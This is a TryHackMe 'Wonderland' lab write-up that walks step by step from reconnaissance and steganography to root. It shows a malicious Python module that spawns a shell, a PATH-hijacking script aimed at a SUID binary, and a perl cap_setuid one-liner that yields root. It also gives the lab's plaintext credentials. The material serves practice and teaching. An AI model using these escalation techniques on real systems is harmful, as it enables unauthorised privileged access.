# Wonderland — TryHackMe Write-up

## 1. Reconnaissance

Initial scan:

```bash
nmap -sC -sV 10.112.171.26
```

The following open ports were discovered:

- `22/tcp` — SSH
- `80/tcp` — HTTP

Full TCP port scan:

```bash
nmap -sC -sV -p- 10.112.171.26
```

No additional open TCP ports were found.

## 2. Web Enumeration

The main page contained the hint `Follow the White Rabbit`.

Directory enumeration:

```bash
gobuster dir -u http://10.112.171.26/ -w /usr/share/wordlists/dirb/common.txt
```

The following paths were discovered: `/img`, `/index.html`, and `/r`.

The image directory contained the following files:

- `alice_door.jpg`
- `alice_door.png`
- `white_rabbit_1.jpg`

## 3. Steganography

I checked the image using `steghide`:

```bash
steghide extract -sf white_rabbit_1.jpg
```

The tool extracted a file named `hint.txt` containing:

```text
follow the r a b b i t
```

This hint pointed to the following path:

```text
http://10.112.171.26/r/a/b/b/i/t
```

The page source revealed the following credentials:

```text
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

## 4. Initial Access — Alice

I connected via SSH:

```bash
ssh alice@10.112.171.26
```

After logging in, I checked the available privileges:

```bash
sudo -l
```

The output showed that I could run a Python script as `rabbit`:

```text
(rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

The script used the `random` module, and the `/home/alice` directory allowed me to create a file named `random.py`.

I created a malicious replacement module:

```python
import pty
pty.spawn("/bin/bash")
```

Then I executed the permitted script:

```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Since Python loaded the replacement module from the writable directory, I obtained a shell as `rabbit`.

## 5. Privilege Escalation — Rabbit to Hatter

I discovered a SUID binary named `teaParty` in `/home/rabbit`.

Examining the binary's strings revealed that it executed the `date` command without specifying its absolute path. This suggested a potential vulnerability involving executable lookup through the `PATH` environment variable.

I created a replacement `date` command in `/tmp`:

```bash
cd /tmp
echo '#!/bin/bash' > date
echo '/bin/bash -p' >> date
chmod +x date
PATH=/tmp:$PATH /home/rabbit/teaParty
```

As a result, I obtained a shell as `hatter`.

**Mechanism:** Command hijacking through `PATH` in the context of a privileged SUID binary.

## 6. Credentials — Hatter

I found a password in `/home/hatter/password.txt`:

```text
WhyIsARavenLikeAWritingDesk?
```

I used this password to log in via SSH as `hatter`.

## 7. Privilege Escalation — Hatter to Root

Before finding the successful escalation vector, I checked several common possibilities:

- **Sudo permissions:** `sudo -l` did not reveal a usable route to elevated privileges.
- **SUID binaries:** I enumerated SUID executables using `find / -perm -4000 -type f 2>/dev/null`. The results contained standard system binaries, but no useful custom SUID binary was identified.
- **Readable and writable files:** I checked for interesting files, exposed credentials, and writable scripts that could lead to privilege escalation. These checks did not reveal a viable route.

I then checked Linux capabilities:

```bash
getcap -r / 2>/dev/null
```

The output was:

```text
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Perl had the `cap_setuid+ep` capability, which allows a process to change its UID. This was the key finding that led to the privilege escalation.

I tested the following command:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

After successfully escalating privileges, I verified the current user:

```bash
id
```

The output confirmed that the process had UID `0` (root), although the group ID remained `hatter`.

## 8. Lessons Learned

- `nmap` helps identify accessible network services.
- `gobuster` is used to discover hidden web paths.
- `steghide` can extract hidden data from supported files.
- `sudo -l` displays commands that can be executed with elevated privileges.
- Python module hijacking can be dangerous when a privileged script imports modules from a directory writable by an unprivileged user.
- SUID programs that execute commands without absolute paths may be vulnerable to `PATH` hijacking.
- Linux capabilities can grant individual privileges to a program without providing the full set of root permissions.
